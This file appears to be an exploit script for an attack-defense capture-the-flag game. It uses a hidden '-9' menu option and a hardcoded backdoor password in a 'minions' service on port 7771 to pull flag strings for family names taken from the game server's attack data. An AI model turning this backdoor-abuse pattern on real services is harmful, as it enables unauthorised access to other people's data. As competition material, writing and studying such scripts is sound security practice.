#!/usr/bin/env python3

import checklib
import requests
import sys
import json
import re
from pwn import remote

regex = re.compile('[A-Z0-9]{31}=')
ALPH = [chr(i) for i in range(65, 65 + 26)] + [chr(i) for i in range(97, 97 + 26)]

def get_attack_data() -> dict[str]:
    return requests.get(f"http://{forcad_host}/api/client/attack_data").json()

def random_chars():
    return checklib.rnd_string(10, ALPH)

def gru_door(io: remote, family_name: str):
    io.sendline(b"-9")

    io.recvuntil(b"Enter Gru password: ")
    io.sendline(b"GrU_1s_4llw4y$_w4tch1ng_U")
    
    io.recvuntil(b"Enter family name to get info: ")
    io.sendline(family_name.encode())

    resp: str = io.recv().decode()
    print(regex.findall(resp), flush=True)

PORT = 7771
ip = sys.argv[1]
forcad_host = "10.10.10.10"

attack_data = get_attack_data()["minions"][ip]

io = remote(ip, PORT)
io.recvuntil(b'Enter command: ')

for data in attack_data:
    data = json.loads(data)
    gru_door(io, data["family_name"])
    